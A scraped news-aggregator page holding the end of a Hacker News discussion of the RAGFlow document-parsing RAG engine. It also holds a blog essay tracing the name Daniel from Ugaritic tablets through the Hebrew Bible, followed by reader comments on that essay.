standard for LLM oriented B-side scenarios, so that's why we adopted this name. reply gardenfelder 14 hours agoprevIt seems to be limited to certain LLM servers, on of which is OpenAI, none of which includes e.g. Mystral and popular OSS LLMs. I wonder if that will change - eventually. Discord channels are named in Chinese, though there are English posts. reply shekhar101 14 hours agoparentIt's trivial to run a proxy server that routes all OpenAi calls to another LLM, even local ones. See litellm-proxy. reply rosspackard 10 hours agoparentprevLooks like they do but aren't really documented yet: https://github.com/infiniflow/ragflow/pull/119 reply bschmidt1 12 hours agoparentprevI see a `LocalLLM` chat model where it looks like you can pass a host/port (for example, ollama's) reply vissidarte_choi 5 hours agoparentprevRAGFlow will support more LLMs, including locally deployed LLMs. reply constantinum 7 hours agoprevDocument processing is getting better and better with new tools leveraging LLMs. If anyone is interested in exploring this space, try another similar tool LLMWhisperer (https://llmwhisperer.unstract.com/). It is a part of Unstract, an open-source document processing tool (https://github.com/Zipstack/unstract) reply yingfeng 13 minutes agoparentActually we've tried almost all lof existing open source models for document processing, and none of them performs well for complex documents, especially those having complicated tables, such as tables cells without borders, cells need to be combined,...,etc. Although adopting LLMs to perform such document understanding tasks is more scalable, it requires much more data and computation power to achieve similar results. That's why we design such models start from scratch. reply demilich 32 minutes agoparentprevCool! This is really helpful. reply TuringNYC 5 hours agoparentprevDo you have any recommendations for extraction from Powerpoint documents? Those seem like the worst since each of the layouts tend to be unique (unlike the AMEX Statements in the example) reply zzleeper 8 hours agoprevI'm partly sad at the approach this and other engines take: reimplement each part (PDF parser, etc etc) in a way where they are pretty much useless except in their specific engine. If instead we had a PDF() class that did what RAGFlow is doing (dealing with all the different trade-offs of the different python PDF engines such as pdfplumber), then we could easily adapt it and improve it, and it can be useful for other projects as well. reply demilich 33 minutes agoparentEach project has its own detailed requirements and scenarios, and we cannot demand that each project use same library to implement similar functions reply trenchgun 1 hour agoparentprevIt is open-source though. Just rip it off and make that PDF() class. reply demilich 2 hours agoprevThe recognition of file layout to parse file content is indeed a very innovative idea. Compared to many open-source projects we have seen before, this provides us with new ideas for using RAG to solve problems in the future. I hope the author of this project will continue to update it, so that more people can benefit from it. reply forrest2 2 hours agoprevA lot of the yolo stuff from ultralytics is AGPL3 fyi. Recommend caution depending on what code or models / model lineage are used reply yingfeng 1 hour agoparentThanks for your nice suggestion. We train the model using YOLO, but during inference, the model is converted into ONNX and we use ONNXRuntime for the model inference. As a result, YOLO itself is not included in the software package. We will open the training code in the repo soon. reply NKosmatos 11 hours agoprevIf only they supported local LLMs out of the box. I have a very specific use case buy it needs to run locally offline only. Any suggestions/recommendations from fellow HN users are more than welcomed :-) reply vissidarte_choi 5 hours agoparentTo be honest, RAGFlow already supports this but has not documented this local deployment process yet, as we are still working on simplifying this process, and will release this feature soon. Please keep tuned! reply rosspackard 10 hours agoparentprevLooks like they do but aren't really documented yet: https://github.com/infiniflow/ragflow/pull/119 reply StrayHardball 1 hour agoprevDoes anyone know what software was used to create the \"System Architecture\" diagram? reply zingiscool 1 hour agoparentHello friend, I would like to recommend the FigJam feature in Figma to you, a common tool used by high-tech companies for creating Information Architecture (IA). Our company always adheres to the tool usage standards of high-tech companies. For guidance on how to use the FigJam feature in Figma, you can refer to this link: https://youtu.be/axDzyLEfYgU?si=V6tqO_tEUKYuLxrL (or search for FigJam on YouTube). Here are three quick tips on how to efficiently create Information Architecture(Also called System Architecture): Start with the Sketch method by drawing your product's Information architecture on paper. Communicate with your PM, design, and development team to validate its effectiveness. Open FigJam in Figma to turn it into an electronic version. This step is crucial as design and development will follow the version in FigJam for collaborative work. When creating your Information Architecture (IA), first identify the core functionalities of your product, represented by one color. Next, determine what sub-functions each core functionality can be divided into, marked by a second color. Finally, decide what detailed functionalities compose each sub-function, indicated by a third color. Continue in this manner until you complete the entire IA construction. It’s important to note that perfecting the IA is not a linear process; it will go through multiple iterations and modifications. Every great product undergoes this process. Also, initially, you can focus on creating an IA for just one core functional module (usually the innovative feature with the highest user pain point) without defining the entire scope. In essence, flexibly establishing the IA to achieve company goals is the primary task. reply bschmidt1 12 hours agoprevIs there a JavaScript library? Both LlamaIndex and Langchain have nice JS/TS packages on npm. Could thinly wrap a JS client around this Python API but the community aspect of having an official library is nice. Also might be helpful to have a simple example on the README showing how to fetch a document and start querying it. I would try it! reply vissidarte_choi 7 hours agoparentHi bschmidt1, This is a good feature. We do plan to support it soon. Please stay tuned. If you have further suggesions, welcome to file an issue with us. reply yding 8 hours agoprevThis is really cool! Starred and look forward to seeing how this develops further! reply esafak 14 hours agoprevApparently \"deep document understanding\" refers to OCR and structured document parsing: https://github.com/infiniflow/ragflow/blob/main/deepdoc/READ... Since \"deep document understanding\" is not a term of art, I would have just said \"OCR and document parsing\". How well does it work? Please include benchmarks. You may be interested in https://paperswithcode.com/sota/optical-character-recognitio... https://paperswithcode.com/task/document-layout-analysis The models seem to be closed source, hosted here: https://huggingface.co/InfiniFlow/deepdoc reply yingfeng 4 hours agoparentWe've used YOLOv8 as the object detection model, and use some public datasets, such as PubTable, CDLA, together with some private data to train the model. The model on Huggingface is the one trained using public dataset, and we would open this work later. We use YOLOv8 just because we want to let the document parser run without GPU, I think you could also try any other object detection models such as Detectron, and use the public datasets to train the model as well. We've not used transfomers for this task, because given limited data, it could not outperform traditional CNN based models. reply snats 10 hours agoparentprevA bit off topic but every time I see DTrOCR I remember that marketing is a good idea because DTrOCR[1] and Fuyu[2] are basically the same architecture[3]. [1] https://arxiv.org/pdf/2308.15996v1.pdf [2] https://www.adept.ai/blog/fuyu-8b [3] If you don't want to search for the figures I made a tiny post about it on my weblog: https://weblog.snats.xyz/posts/2024/02/16/ reply vissidarte_choi 5 hours agoparentprevRAGFlow uses Yolov8 for its OCR/layout recognition/TSR(table structure recognition). And RAGFlow uses large amount private data to train these models for them to perform well in some specialized scenarios. reply dang 14 hours agoparentprevOk we've taken deep document understanding out of the title above. Thanks! reply kergonath 11 hours agoparentprevI am curious about the performance of their OCR and layout and table detection. Hopefully it’s on par with Amazon, Google, or Microsoft’s tools. reply cetra3 10 hours agoprev [–] I don't consider this strictly open source if components it depends on (I.e, the LLM) is closed source. I've seen a lot of these Fauxpen source style projects around reply vissidarte_choi 5 hours agoparentNot quite certain about your meaning. Could you be more specific? RAGFlow does not have its own LLM model or souce code. RAGFlow supports API calling from third-party large language model providers, as well as local deployment of these large models. RAGFlow has open-sourced these two parts of codes already. reply viraptor 10 hours agoparentprev [–] It only depends on the interface. There's a lot of projects which present the openai interface to whatever you want. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "RAGFlow is an open-source engine leveraging deep document understanding, known as RAG (Retrieval-Augmented Generation), for businesses seeking a streamlined workflow.",
      "It combines Large Language Models for question-answering with grounded citations, offering features like knowledge extraction, template-based chunking, and compatibility with diverse data sources.",
      "The system is Docker-compatible, configurable via multiple files, designed for easy business integration, and welcomes contributions from the open-source community."
    ],
    "commentSummary": [
      "RAGFlow is an open-source RAG engine focusing on layout recognition, document parsing, and table extraction, showing promise in document analysis.",
      "Debates arise over the project's name, inclusion of different perspectives, the use of proxy servers, document understanding challenges, and open-source project advantages.",
      "Performance comparison with Amazon, Google, and Microsoft tools in OCR, layout, and table detection raises concerns over RAGFlow's completely open-source status due to its dependence on closed-source components."
    ],
    "points": 182,
    "commentCount": 46,
    "retryCount": 0,
    "time": 1711993854
  },
  {
    "id": 39895035,
    "title": "The Legacy of Daniel: A 3,400-Year Journey",
    "originLink": "https://www.hillelwayne.com/post/tale-of-daniel/",
    "originBody": "The Tale of Daniel Contact via Email Open Github account in new tab Posted on Apr 01, 2024 It’s April Cools! It’s like April Fools, except instead of cringe comedy you make genuine content that’s different what you usually do. For example, last year I talked about the strangest markets on the internet. This year I went down a different rabbit hole. Daniel has been a top 5 baby name twice since 2000. There are over 1.5 million Daniels in the United States (and almost 100,000 last-name Danielses). There are who knows how many Dans, Dannies, and Daniellas out there. “Daniel” is, by any way you slice it, a very modern name. It may be the oldest attested name in common use. Last year was Chicago’s last Newberry Library book sale. Part of my haul was several collections of ancient literature: I’m interested in ancient history, which shouldn’t be a surprise to anybody who reads this blog. And I love how their literature reflects the modern human experience. Take this lament carved in a pyramid from the Egyptian Middle Kingdom: I have heard the words of Imohotep and Hardedef \\ Whose sayings are recited whole. \\ What of their places? Their walls have crumbled, \\ Their places are gone, \\ As though they had never been! (pg 196) This anonymous poet, writing 4500 years ago, shares our fears about losing our past and of our memories being forgotten. Beautiful. But I found something far more relevant in the Mesopotamian literature. Straightway Daniel the Raphaman … gives oblations to the gods to eat (pg 118) Daniel the Raphaman DANIEL The story comes from the Tale of Aqhat, pulled out of the ruins of a forgotten city, estimated to approximately 1350 BCE. That’s a hundred years older than the oldest known Chinese writing, one thousand years older than the book of Daniel, and thirty-four hundred years before today. I needed to know if this was the same name, transmitted across cultures, stretching 3400 years of unbroken “Daniels” to our modern day. Is this where “Daniel” comes from, or is just a strange coincidence? A historian of the modern world has to learn how to sip from a firehose of evidence, while the historian of the ancient world must learn how to find water in the desert. — Bret Devereaux I’ve done some historical work before, but all of it was in software, a “history of the modern world”. I decided to try anyway. This is what I’ve put together from reading books and trawling JSTOR.1 This is the tale of Daniel. Ugarit Obviously, finding an unbroken lineage of specific Daniels across three millennia is impossible. Instead, I want to learn if the name was in the “cultural consciousness”. If so, we can be modestly confident that real people are getting named Daniel, like how real people are being named Khaleesi today. So let’s start with where the name was first found. Ugarit was a port city of the shores of Ras Shamra, unknown until 1928. Scholars believe that it was a city of roughly 8,000 people and the capitol of a kingdom of 20,000 (ref). While never a great power, Ugarit was a fairly “literate” society and had extensive trade relations with all of the regional powers. Along with a trove of archaeological material (pots and doodads), excavators also found large collections of clay tablets. Like with many Bronze Age civilizations, most of these recovered documents are either religious, diplomatic, or administrative. That’s because clay tablets are expensive and only reserved for important matters. Most of these were dated to very approximately 1500-1200 BCE. But also in that collection, we found three piece of literature. The first, the Baal Cycle, tells of how Baal Hadad became one of the great gods of the Ugaritic pantheon. The second, the Legend of Keret, probably matters a lot to another person chasing a completely different white whale, but doesn’t matter to me. The final one, the one that started this obsession of mine, is the Tale of Aqhat. One of three recovered tablets that make up the tale. (source) I found this picture in the InscriptiFact collection. Sadly no digital transcription! It tells of the story of the great hero Aqhat, who was loved and murdered by the goddess Anath. But I don’t actually care about any of that, I’m only after the Daniel. I’m pretty sure this is Daniel’s name: I have a few friends who can read cuneiform, so I asked if any understood this text. I found out 1) that’s like asking a person who “can read ASCII” if they can understand Spanish, and 2) this is not actually cuneiform. It’s just an alphabet that looks like cuneiform. The Ugaritic alphabet. (source) Aqhat’s father is 𐎄𐎐𐎛𐎍. Left to right: D, N, ‘I, L. “Judged by El”, El being the chief God in the Ugaritic pantheon. The name could be older than this text, since most early written myths were first oral traditions. This is just the first time the name “Daniel” is attested. The name could also be a lot younger, at least the modern name. The old name could just be an unusual coincidence, like how people in both England and China have the last name “Lee”.2 For “Daniel” to be that old, it’s not enough for the Ugarits to have had the name, it has to come from them, in a chain of Daniels reaching into present. And here we run into a problem. We know roughly how old the tablets are because we know roughly when the city collapsed. By cross-referencing names of Egyptian rulers that appear in Ugarit tablets with the much better preserved Egyptian corpus, historians estimate that the city collapsed around 1190 BCE. This corresponds with the “Bronze Age Collapse”, a cataclysmic era where dozens of cities and kingdoms in the region are turned to ruins. Scholars still don’t have a clear picture why. Regardless of the why, the Ugarites disappeared from history. The name Daniel would have to be carried by a new generation. But this is also where the chain breaks. Phoenicia The Ras Shamra find was a one-in-a-million miracle, an enormous corpus of about 40,000 words, roughly as much as one Harlequin romance novel. After that? Well, here’s the Hadad Statue: The Hadad Statue (source) If you look closely, you can see the bottom is covered in faint writing. The language is “Samalian”, one of the many languages in the region. The engraving is roughly 400 words long and represents over half of all Samalian. This essay is four times longer than the Samalian corpus. So what happened? It’s easy to imagine the Bronze Age Collapse turning the broader region into a Stone Age wasteland, but the archaeological evidence suggests the opposite. Rather, it points to a rapid economic recovery of the region, with new kingdoms soon establishing a large number of seafaring trade routes. Eventually they’d come in contact with the Greeks, who’d call all of the many distinct groups “Phoenicians”. But we know so little of what the “Phoenicians” (in all their languages) wrote because of how they wrote it. Instead of Ugarit’s clay tablets, the Phoenicians used papyrus. Papyrus is lighter and cheaper, but also rots after a few decades. The fragments of text we do have— with one big exception— are engravings.3 Inscriptions on tombs, statues, weapons, etc. This is a major problem for historians, but an even bigger problem for me, because it makes the question of Daniel impossible to answer. Nonetheless, we can look for clues that the same stories persisted, even if we don’t have concrete evidence. Let’s start with the first two lines of the Hadad statue: 𐤀𐤍𐤊 𐤐𐤍𐤌𐤅 · 𐤁𐤓 · 𐤒𐤓𐤋 · 𐤌𐤋𐤊 · 𐤉𐤀𐤃𐤉 · 𐤆𐤉 · 𐤄𐤒𐤌𐤕 · 𐤍𐤑𐤁 · 𐤆𐤍 · 𐤋𐤄𐤃𐤃 · 𐤁𐤏𐤋𐤌𐤉· 𐤒𐤌𐤅 · 𐤏𐤌𐤉̇ ·· 𐤀̇𐤋𐤄𐤅 ·· 𐤄𐤃𐤃 · 𐤅𐤀𐤋 · 𐤅𐤓𐤔𐤐 · 𐤅𐤓𐤊𐤁𐤀𐤋 · 𐤅𐤔𐤌𐤔 · 𐤅𐤍𐤕𐤍 · 𐤁𐤉𐤃𐤉 This is the “Phoenician alphabet”—the same one that inspired the Greek alphabet— which many distinct cultures in the region used for their own languages. Unlike Ugaritic, it’s read right-to-left. Scholars don’t think this alphabet descended from Ugaritic, but the two writing systems are closely related: the same sounds appear in roughly the same places in the alphabet.4 Here’s the translation (from wiki): I am Panamuwa, son of Qarli, king of Y’DY, who have erected this statue for Hadad in my eternal abode (burial chamber). The gods Hadad and El and Rašap and Rākib-El and Šamaš supported me. The same gods, El and Baal Hadad, are important gods in the Ugarit corpus! And this is coming four hundred years after the fall of Ugarit. It suggests the Baal Hadad and El weren’t local gods to the Ugarits, but regional gods, part of a shared culture. The tale of Aqhat could have been preserved as a literary tradition, just on sources we don’t have anymore. And with Aqhat comes his dad(niel). To get out of the Daniel dark ages, we have to look at a different inscription found 600 miles away. The Misha Stele (source) Like the Hadad statue, the Misha Stele is one of our only sources on a long-dead language. In this case, Moabite. It’s a distinct language from Samalian but this uses the same Phoenician alphabet. Here’s a sample (also from wiki): I have built its gates and I have built its towers. I have built the palace of the king, and I made the prisons for the criminals within the wall. And there were no wells in the interior of the wall in Karchah. And I said to all the people, ‘Make you every man a well in his house.’ And I dug the ditch for Karchah with the chosen men of Israel. Israel? Yes, Israel. The Greeks called this region Phoenicia, but the locals always called it Canaan. The same “Canaan” from the Bible. The Israelites were a Canaanite population with Canaanite religions: Israel literally means One who fought El. Slowly, over years and centuries, they developed their own ethnic identity. At some point, there were two Israelite kingdoms: the kingdom of Israel/Samaria in the north and the kingdom of Judah (where we get “Jew”) in the south. Moab is here, too (source) Israel was conquered in 720 BCE while the kingdom of Judah limps along, in one form or another, until 130 CE.5 And it’s through the people of Judah that we have the best corpus of that region’s writing. \"Présentation de la Loi\" (source) The Torah, or “Old Testament”, is a 300,000 word corpus of ancient Hebrew, chronicling the stories, religious practices, and history (mythic and attested) of the Jews.6 It’s the reason we can decipher the scant inscriptions of other Canaanite languages like Moabite, Samalian, and even Ugaritic itself! And it’s where the tale of Daniel continues. Judah Quick recap on Daniel so far: we know the Ugarites wrote about a son of Daniel, the Canaanites (nee Phoenicians) shared a culture with the Ugarites, and the Israelites shared a culture with the Canaanites. In 600 BCE, the Neo-Babylonian empire conquered Judah, which leads to the sixty year “Babylonian exile” of Jews from Canaan. It’s allegedly during this time that we get the collection of prophecies known as the “Book of Ezekiel”.7 Mostly it’s about how the Jews lost the favor of God and will one day earn it back, and with it redemption. Far, far more importantly, it marks the triumphant return of Daniel. “Son of man, if a land sins against Me by trespassing grievously, I shall stretch forth My hand upon it and break its staff of bread, and I shall send famine upon it and cut off from it both man and beast. Now should these three men be in its midst- Noah, Daniel, and Job-they would save themselves with their righteousness, says the Lord God.8 — Ezekiel 14:13-14 Daniel is written (דנאל). As a distant descendent of Phoenician, Hebrew reads right-to-left: Daled, Nun, Aleph, Lamed. “God judged me.” Same meaning as the Ugaritic name, same letters as 𐎄𐎐𐎛𐎍. I’m amazed that the same meaning can be preserved across so many centuries. But I also want to be as thorough as possible. Two names, eight hundred years apart, with the same meaning, is still not enough for me. I still worry that it could just be an enormous coincidence that two cultures in the same region, speaking sister languages, came up with the same name-meaning. Ezekiel provides the missing link. In the Torah, both Noah and Job are treated as pious men, but critically, neither are Israelites.9 Making Daniel part of the trio implies he was also a righteous non-Jew. Ezekiel would expect people would know who “Daniel” was if he used that name. This would make sense if Daniel was, say, a righteous figure in the broader Canaanite folklore. At least the Tale of Aqhat implies he was a righteous and just man who was worthy of El’s blessing. He prayed for a son and his wish was granted. He’d be a distinct character, a known righteous non-Israelite, which Ezekiel used as a point of reference. A tenuous chain, I know, but enough to persuade me at least. Enough to persuade other scholars too. It may be the best we’ll ever do. We can finally use the Bible to establish that Daniel wasn’t just a folkloric name, but a name people actually used. From the Book of Ezra: And these are the heads of their father’s houses and the lineage of those who ascended with me in the kingdom of King Artaxerxes from Babylon. Of the sons of Phinehas, Gershom: of the sons of Ithamar, Daniel; of the sons of David, Hattush. — Ezra 8:1-2 And these were the sons of David who were born to him in Hebron: the firstborn, Amnon, to Ahinoam the Jezreelitess; the second, Daniel, to Abigail the Carmelitess. — Chronicles 3:1 If they’re using Daniel as the name of a minor son of a minor figure, it’s probably a real name. The False Daniel But now we have a problem. The Ezekiel Daniel has four letters. But all of the later Daniels have five: Daled, Nun, Yud, Aleph, Lamed (דניאל) . It’s still possible to read the four-letter version as “Daniel” but it’s more likely to be “Danel” or “Danil”. And, Ezekiel’s Daniel being closest to the Ugaritic DN’IL, suggests that DN’IL was also “Danel”. That’s how most modern scholars now transliterate the name. So yes, I may have been chasing a false Daniel this whole time. Theophanu is not Tiffany, after all. Maybe “Daniel” is at best attested from 600 BCE, putting it in contention with things like Debrah and Zhou. There is a tradition to pronounce the Ezekiel DN’IL as “Daniel”, so it could be the actual pronunciation and the Yud was added later. I don’t know when the tradition started, though. At the very least, this strengthens the connection between Ezekiel’s דנאל and the Ugarite’s 𐎄𐎐𐎛𐎍: Ezekiel was working off a different name than the rest of the Torah authors. Then again, maybe this is all just quibbling over specifics. The Latin alphabet wasn’t meant for Canaanite names, and the Hebrew alphabet wasn’t meant for Ugaritic ones. The Biblical שרה could be Romanized as “Sarah” or “Sara”, חנכה could be Hannukah, Channuka, or Chanukah. Maybe it doesn’t matter whether 𐎄𐎐𐎛𐎍 is דניאל or Danel or דנאל or Daniel. It’s still the same name. Regardless, we’re following a chain, and there’s still one more link. From Daniel to Today There’s one last question here: lots of people use Torah names, like Sarah and Benjamin and David. But many Torah names, like Tamar and Yehuda and Hillel, are only used by Jews. Why is Daniel in the former group and not the latter? I’d speculate that the difference is how likely it is for a Christian reader to encounter the name. “Adam” appears in the first book of Genesis, while Shamgar is a minor figure in the book of Judges. Christians would most likely encounter names that appear either really early, have entertaining stories, or are directly relevant to the New Testament. And here’s where we finally get to the last link between then and now: the Book of Daniel. Like the Book of Ezekiel, this recounts the story of someone living during the Babylonian exile. Unlike Ezekiel, it was pretty clearly written four hundred years after the exile. Daniel contains an awful lot of prophecies that seem very relevant to the Greek occupation (the one that leads to the story of Channukah). The most famous of them is the prophecy of 70 weeks: And you shall know and understand that from the emergence of the word to restore and to rebuild Jerusalem until the anointed king [shall be] seven weeks, and [for] sixty-two weeks it will return and be built street and moat, but in troubled times. — Daniel 9:25 Later writers took this to be a prophecy about Jesus. I don’t admit to understand how it’s supposed to be about Jesus, but it is. So the book of Daniel is really important in Christian thought. This kept the name “Daniel” in the Christian mainstream for the next 2000 years, carrying it across the world to Europe and India and East Asia and South America, all the way to the present daytoday. The end of a 3400 year chain. So that’s the story of the name of Daniel, from an ancient clay tablet to the millions of Daniels alive now. I want to reiterate that I’m not a trained historian and almost certainly got a lot of details wrong. Also, this isn’t and wouldn’t pass peer review. Don’t cite this for a class paper. Happy April Cools! Thanks to Predrag Gruevski for feedback. If you enjoyed this, check out the April Cools website for all the other pieces this year! I accessed JSTOR as a UChicago Alumnus benefit, but I also found out that anyone with a Chicago public library card has access too! Hundreds of public libraries do this! [return] Note though that the Chinese “Lee” is just one possible Romanization of 李. “Li” is another. [return] We have a much larger Egyptian corpus because papyrus lasts longer in Egypt’s hot and arid climate. We have large Greek and Roman corpuses because monks tirelessly copied old texts into new books for centuries. Volcanoes helped. [return] We know the order because we’ve recovered Ugarit abedecaries (inscriptions of all an alphabet’s letters in order). [return] At least, that’s when Jews were permanently expelled from the region. Growing up I was taught that the important event was the burning of the Second Temple, which happened in 70 CE. [return] I grew up an Orthodox Jew, and it’s extremely weird to study the actual history of your religion. Like vivisecting holy books. [return] From my research it seems that it’s generally accepted that most of Ezekiel is written contemporaneously with the Babylonian exile, though it may have been smoothed out later. [return] For Old Testament verses I’m using the Chabad translations. My Hebrew never got past a first grade level. [return] Noah is obvious: his story takes place before Abraham’s. Job is tougher, as there’s nothing in the story that makes it clear he’s not Jewish. I’m basing this off the claims of many different Rabbis and modern scholars. [return] Categories: April Cools Tags: April Cools",
    "commentLink": "https://news.ycombinator.com/item?id=39895035",
    "commentBody": "The Tale of Daniel (hillelwayne.com)172 points by hwayne 18 hours agohidepastfavorite53 comments losvedir 16 hours agoAs the father of a son named Daniel, I found this fascinating. Thanks! I think I agree with the comment in the conclusion that Torah names are used by non-Jews when a Christian comes across the name. But I don't think in this case it's because of the supposed prophecies about Jesus but because the stories about Daniel in the Book of Daniel are memorable. I remember hearing about \"Daniel in the Lion's Den\" and Daniel sitting in flames in church and in my Children's Bible stories. But I chose the name for my son not (directly) because of its religious significance but because it's a normal, known name, in both English and Spanish. That is, neither a WASP American or a Mexican will really bat an eye at it. As a Hispanic American, that's something I've appreciated about my own name, Gabriel (and would love a historical deep dive on that name!). I couldn't really find any other names like that. reply AlotOfReading 12 hours agoparentGabriel is a conjunction of gabri- (heroic man), and -el (god), roughly translating to \"man of God\". -el is just a generic proto-semitic word for god that long predates any sort of written language. gabri- is likely related to a well known Aramean king named Gabbār, documented in the Kilamuwa stela alongside his (honorable) god Ba'al SMD. It's entirely possible that there's some recursive etymology here though, as is common with dynastic names. reply Hayvok 13 hours agoparentprev> I remember hearing about \"Daniel in the Lion's Den\" and Daniel sitting in flames in church and in my Children's Bible stories. Minor nitpick, but it was Daniel's three friends who were thrown into the furnace, not Daniel himself. They are both indeed memorable stories. reply xp84 7 hours agorootparentShad’rach, Me’shach, and Abed’nego were thrown into the fiery furnace if I remember correctly. (Please forgive any spelling variations) reply lfpeb8b45ez 6 hours agorootparentOr Hananiah, Mishael, and Azariah, to use their less well known Hebrew names. reply malingo 4 hours agoparentprevThe story of Daniel killing the dragon with hair cakes is also pretty good: https://biblehub.com/catholic/daniel/14-26.htm reply aidenn0 14 hours agoparentprevGabriel also appears in both the Hebrew scriptures (in the Ketuvim, which only names two angels) and the Gospels, being both the angel who explains Daniel's visions to him, and involved in the revelations for the births of both Jesus and John the Baptist. Is Michael (or it s cognate) at all common as a name in Mexico? That's a figure that is at least as prominent as Gabriel across the Abrahamic religions (in particular the prominent inclusion in the Leonine Prayers keep it a popular name in many Roman Catholic regions). reply klipt 14 hours agorootparent> Michael (or it s cognate) at all common as a name in Mexico That would be Miguel. reply 082349872349872 15 hours agoparentprevDavid, Leonardo, Sebastian? (just going off baby name sites; wonder what ads I'll be seeing for the next few weeks?) There was a line in To Kill a Mockingbird about being named for a Confederate general leading to slow, steady, drinking, but when I looked at https://en.wikipedia.org/wiki/List_of_American_Civil_War_gen... they have the WASP standards: British kings, Other kings, Biblical. (they also don't [from looking at A-C] seem to have thetriad that was common in certain parts of the US during my youth) reply justusthane 14 hours agoparentprevYou might like this site, which gives name overlaps between two languages: https://mixedname.com/english_spanish_masculine_names reply limaoscarjuliet 13 hours agorootparentThat Venn diagram showing a child coming out from center of two round overlapping circles might be not the best choice, especially when pink color circles are at play when looking for feminine names :-) P.S. A bit of noise in the data too, some names in Polish/English pairs are not really good. reply SamBam 8 hours agorootparentMaybe it's intentional, and made by people who are not embarrassed to know where babies come from. reply madcaptenor 15 hours agoparentprevAs a father of a daughter named Claudia, it has that property as well, although that doesn't help you since you have a son. reply KingMob 1 hour agoprevReally cool article. I'm not sure about one point, though. > In the Torah, both Noah and Job are treated as pious men, but critically, neither are Israelites. Making Daniel part of the trio implies he was also a righteous non-Jew. Doesn't this confuse being Israelite with being Jewish? IIRC, the kingdom of Israel predates the Jewish religion by a few hundred years, based on older archaeological references to the kingdom's name from neighboring kingdoms. reply vundercind 15 hours agoprevOh wow, don’t encounter Lichtheim too often on most parts of the Web! There’s a third volume, too. Nb they were released far enough apart that later volumes contain errata for earlier ones (like calling out fraudulent or mistaken dates on some of the works, which errors weren’t discovered until after the volume was printed) I’ve read them cover to cover. Tried that with single-volume collections of Akkadian and Sumerian literature, but they were way harder to follow—too fragmentary, too little context. Didn’t finish either. Gilgamesh is amazing though, and easily the best pre-Homeric work I’ve read, zero competitors are even close. reply huytersd 9 hours agoparentNonsense, the Mahabharata is definitely a fantastic epic written around 1500BC. Definitely far superior to the Iliad. reply SamBam 8 hours agorootparentI'm not sure how much evidence there is that the actual text of the Mahabharata is anywhere near that old. Wikipedia says > The bulk of the Mahābhārata was probably compiled between the 3rd century BCE and the 3rd century CE, with the oldest preserved parts not much older than around 400 BCE. [1] The actual events that it was based on are older. The same article says that the Kurukshetra war was probably around 1000 BCE, and that there may have been events referenced that are older than that. I don't know that there is accepted evidence that it was written much before 400 BCE, though. 1. https://en.m.wikipedia.org/wiki/Mahabharata reply vundercind 9 hours agorootparentprevI haven’t made it to the short list (not just one entry!) of Indian works that, by reputation, may been in that same very-good category :-) I have read a lot more literature from before 1000 BC than most people have, though. That’s just one big blind spot for me, so far. reply danielvf 16 hours agoprevA fun article! I think a more probable understanding of the \"Daniel\" reference in Ezekiel is that it is same Daniel from the book of Daniel. Even if you assume that the prophecies in the book of Daniel were written retroactively 600 years later (given the accuracy of described events) it does not preclude an actual powerful person of that name being alive at same time as Ezekiel, and being the basis for later attribution. Both Ezekiel and Daniel are written covering a similar set of years. Both refer to a person named Daniel widely famous for his \"righteousness\". It would seem improbable that they were talking about entirely different people. Again, had a lot of fun reading that. reply cess11 14 hours agoparentOn what grounds do you consider it more likely that an historical person rather than the book of Ezekiel inspired the author of the book of Daniel to use the name? How do you explain the lack of other texts about this person if he was that popular and important? reply margalabargala 11 hours agorootparent> How do you explain the lack of other texts about this person if he was that popular and important? On the contrary, based on the linked article, it seems that there are several works of literature from the time referencing Daniel. In fact, for some languages, it appears that close to 100% of known writing samples reference Daniel (because there are only one or two examples). reply steve_gh 2 hours agoprevWhat I find most interesting in the origin of the name is the theological context, \"Daniel\" => Judged by God, indiicating a theological conception that people are accountable to God for their behaviour. Compare this to Greek naming. Even from a slightly later period \"Herakles\" => Fame of Hera. A different relationship to their god(s). reply MrGilbert 15 hours agoprevOh, this is really cool. As a \"Daniel\" myself, I really appreciate the background story of my name. Sometimes, it's also interesting to get to know the story of how someone got their name. When my mum was younger, there was a really cute little boy my mum really liked when she was on vacation with my grandparents. Not in a romantic way, as he was, like, still a small kid. And she then decided that, when I was born in '86, I should receive his name. I found this super cute, and It's one of those stories that will always remind me of my mum. reply dkh 11 hours agoparentMy wife's grandparents on her father's side were Swedish immigrants to the USA, but her father has never known much at all about the Swedish background. A few years ago my wife got really into the ancestry.com thing, and after doing some digging, discovered that her father's first name is what his family's last name was in Sweden, up until migrating to America. While they took on a different, common last name as many did back then, they passed the old name on in their son. I thought this was fascinating, and so did he, as he never knew any of this, either! Just another Daniel born in '86 sharing an interesting name origin story. (My own isn't as wild -- my mother loved the Elton John song.) reply DanielHB 14 hours agoprevAs someone named Daniel it is really nice that it is a common name in most European languages and never deviates in spelling. Please people give your children the most boring name possible. reply nuxi 14 hours agoparent> ...never deviates in spelling. In South Slavic languages it's spelled Danijel as well (same pronunciation). reply DanielHB 59 minutes agorootparentoh first time I heard of a different spelling for Daniel, but at least in all the countries I need to do business in it is the same spelling. reply dimmke 10 hours agoparentprevAs a fellow Daniel, the spelling doesn't deviate much but the diminutives do. I live in Mexico and it's Dani here and in many Spanish speaking countries. I go by Dan and that form is pretty much never used so it causes a lot of confusion. Cool post regardless. reply DanielHB 1 hour agorootparentThe spelling is important so people don't get it wrong when they have to write it down. It can be a bureaucratic nightmare to get this kind of thing fixed sometimes. For example my birth certificate had a typo in my dad's last name and when I was getting my first ID card I had to go to the notary to get the birth certificate typo fixed before getting the ID card issued. Took half a day of work... reply SoftTalker 14 hours agoparentprevAlso, and not claiming there is any cause/effect but there is a correlation, at least for men, between short, common names and career success. C-level individuals tend to have short, one-syllable names (or nicknames) like Jack, Fred, Tim, Don, etc. reply SamBam 8 hours agorootparentThe cause and effect is most likely that upper-middle class and upper class white WASP families overwhelmingly tend to prefer those simple boy names. reply fuzztester 8 hours agorootparentprevPlenty of others have names like that, all the way \"down\" to the trades. reply breckognize 17 hours agoprevGraph of Daniel vs time: https://rowzero.io/workbook/CA82F353F7060CA9411A12EB reply aidenn0 14 hours agoparentMight be nice to adjust per-capita if that information is available. reply pvg 17 hours agoparentprevAnd, for those who enjoy historical primary sources, Damn, Daniel, 2016 CE: https://www.youtube.com/watch?v=kfFcyTuopbI reply em-bee 14 hours agorootparentbecause of the date, i'm gonna let this pass reply Archelaos 15 hours agoprevFor relatively detailed information on the Ugaritic \"Danel\" and his relation to the Book of Ezekiel, see his Wikipedia article at https://en.wikipedia.org/wiki/Danel reply 082349872349872 14 hours agoparentAnyone know of any theories regarding the naming of the robot Daneel? 